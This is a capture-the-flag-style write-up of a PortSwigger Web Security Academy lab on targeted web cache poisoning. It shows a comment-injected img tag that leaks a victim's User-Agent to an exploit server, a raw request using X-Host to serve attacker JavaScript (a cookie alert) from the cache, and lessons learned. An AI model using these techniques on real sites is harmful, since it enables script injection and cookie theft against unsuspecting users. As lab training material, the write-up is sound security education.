# Web Cache Poisoning Lab 4 — Targeted web cache poisoning using an unknown header — PortSwigger

**Platform:** PortSwigger Web Security Academy (free lab)
**Topic:** Web Cache Poisoning
**Lab:** Targeted web cache poisoning using an unknown header
**Difficulty:** Practitioner
**Solved:** 27 November 2026 ~06:35 PKT (banner verified on the instance home page)
**Account:** Arbaz Ahmed Naveed
**Instance:** https://0aa000ad048aa2bd82f201c6001b0061.h1-web-security-academy.net/
**Exploit server:** https://exploit-0a6600cc0422a20b820300e401540077.exploit-server.net

## Vulnerability Type

Targeted web cache poisoning — the cache key includes `User-Agent` (via the `Vary` header), so a generic poison would not reach the victim. The attacker must first learn the victim's exact `User-Agent`, then poison the cache entry keyed to it. The unkeyed input is the `X-Host` header, which the app uses to build the absolute URL of `/resources/js/tracking.js`.

## Solution

1. Stored the exploit file on the lab's exploit server at `/resources/js/tracking.js` with body `alert(document.cookie)`.
2. **Leaked the victim's User-Agent.** The blog's comment feature allows HTML, so I posted a comment containing:
   ```html
   <img src="https://exploit-0a6600cc0422a20b820300e401540077.exploit-server.net/ua-leak.png" />
   ```
   When the victim viewed the post, their browser requested that image; the exploit server's access log showed the request from internal IP `10.0.4.162` with:
   ```
   user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36
   ```
3. **Poisoned under the victim's User-Agent.** Replayed the home-page request with the victim's `User-Agent` and `X-Host` pointing at the exploit server:
   ```
   GET / HTTP/1.1
   Host: 0aa000ad048aa2bd82f201c6001b0061.h1-web-security-academy.net
   User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36
   X-Host: exploit-0a6600cc0422a20b820300e401540077.exploit-server.net
   ```
   The cached home page's `tracking.js` `src` pointed at the exploit server (`X-Cache: hit`); the victim visited and the home page showed "Congratulations, you solved the lab!"

Full solver: `~/workspace/scripts/ps-cache-poisoning.py` (Lab 4).

## Practical Explanation

- **Why targeting is needed:** the response carries `Vary: User-Agent`, so the cache stores a *separate* entry per User-Agent. Poisoning under my own UA would only poison my own entry — the victim's entry stays clean.
- **Why the comment leak works:** the victim regularly reads the blog; an `<img>` in a comment makes their browser fetch a URL I control, and the access log records their exact `User-Agent`.
- **Three environment quirks found while solving:** (a) this lab runs on an `h1-` host whose edge returns HTTP 404 for `/post` when requested with `python-requests`, but HTTP 200 for the identical request via `http.client` — the whole comment flow had to use raw `http.client` requests; (b) only a cache *miss* sets the session cookie, and the comment form's CSRF token is bound to that session, so the post page must be fetched with a cache-buster to get a usable token + cookie pair; (c) comments are rendered by JavaScript (`loadComments('/post/comment')`), so the comment is verified against the `/post/comment?postId=1` JSON endpoint, not the post page HTML. The victim's log entries also use lowercase `user-agent:` — the log parser must match case-insensitively.

## Lessons Learned

- `Vary` headers tell you exactly which inputs are keyed — read them before poisoning, or you will poison the wrong cache entry.
- A stored-HTML feature (comments) is a reliable way to fingerprint a victim's browser: one `<img>` tag leaks the User-Agent.
- When a target behaves differently per HTTP client, drop to raw sockets (`http.client`) and compare — the difference is often at the TLS/ALPN layer, not in your payload.
- Always verify a stored comment through the endpoint that actually serves it (here the JSON API), not the page that renders it with JavaScript.
